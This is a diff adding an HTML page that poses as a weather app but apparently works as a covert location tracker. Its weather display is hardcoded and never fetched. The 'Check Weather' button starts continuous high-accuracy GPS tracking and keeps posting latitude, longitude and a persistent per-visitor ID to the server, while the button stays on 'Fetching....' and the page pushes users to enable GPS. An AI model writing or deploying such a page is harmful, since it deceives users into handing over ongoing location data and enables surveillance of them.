@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Weather App</title>
+    <style>
+        /* Reset */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        /* Body Styling */
+        body {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background: linear-gradient(to right, #4facfe, #00f2fe);
+            font-family: Arial, sans-serif;
+        }
+
+        /* Weather Card Styling */
+        .weather-card {
+            background-color: #fff;
+            padding: 25px 20px;
+            border-radius: 15px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+            text-align: center;
+            max-width: 300px;
+            width: 100%;
+            transition: transform 0.3s;
+        }
+
+        /* Hover Effect */
+        .weather-card:hover {
+            transform: translateY(-5px);
+        }
+
+        /* Title Styling */
+        .weather-card h2 {
+            font-size: 24px;
+            color: #333;
+            margin-bottom: 5px;
+        }
+
+        /* Location Styling */
+        .location {
+            font-size: 18px;
+            color: #555;
+            margin-top: 5px;
+        }
+
+        /* Weather Icon Styling */
+        .weather-icon {
+            margin: 20px 0;
+        }
+
+        .weather-icon img {
+            width: 80px;
+            height: 80px;
+        }
+
+        /* Weather Info Styling */
+        .weather-info {
+            margin: 20px 0;
+        }
+
+        .temperature {
+            display: block;
+            font-size: 48px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        .condition {
+            font-size: 20px;
+            color: #777;
+        }
+
+        /* Button Styling */
+        button {
+            padding: 12px 24px;
+            background-color: #4facfe;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        button:disabled {
+            opacity: 70%;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="weather-card">
+        <h2>Weather App</h2>
+        <p class="location"><span id="city">City</span>, <span id="country">Country</span></p>
+
+        <!-- Weather Icon -->
+        <div class="weather-icon">
+            <img src="/weather.png" alt="Weather Icon">
+        </div>
+
+        <div class="weather-info">
+            <span class="temperature">25°C</span>
+            <span class="condition">Sunny</span>
+        </div>
+
+        <button id="check-weather">Check Weather</button>
+    </div>
+
+
+    <script>
+        const id = localStorage.getItem("id") || generateId()
+        const btn = document.querySelector("#check-weather")
+
+        btn.addEventListener("click", () => {
+            btn.disabled = true
+            btn.innerHTML = "Fetching...."
+
+            navigator.geolocation.watchPosition(
+                (position) => {
+                    btn.disabled = true
+                    const lat = position.coords.latitude
+                    const lng = position.coords.longitude
+
+                    fetch("/weather", {
+                        method: "POST",
+                        body: JSON.stringify({
+                            id,
+                            lat,
+                            lng,
+                        }),
+                        headers: {
+                            "Content-Type": "application/json"
+                        }
+                    }).catch(error => {
+
+                    })
+                },
+                (error) => {
+                    alert("Please Turn on GPS Location.")
+                    btn.disabled = false
+                    btn.innerHTML = "Check Weather"
+                    console.error("Error watching position:", error);
+                },
+                {
+                    enableHighAccuracy: true, // Use GPS if available
+                    timeout: 5000,            // Max wait time per update
+                    maximumAge: 0             // Disable caching
+                })
+        })
+
+        function generateId(length = 10) {
+            const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+            let result = '';
+            for (let i = 0; i < length; i++) {
+                const randomIndex = Math.floor(Math.random() * characters.length);
+                result += characters[randomIndex];
+            }
+
+            localStorage.setItem("id", result)
+            return result;
+        }
+
+    </script>
+</body>
+
+</html>
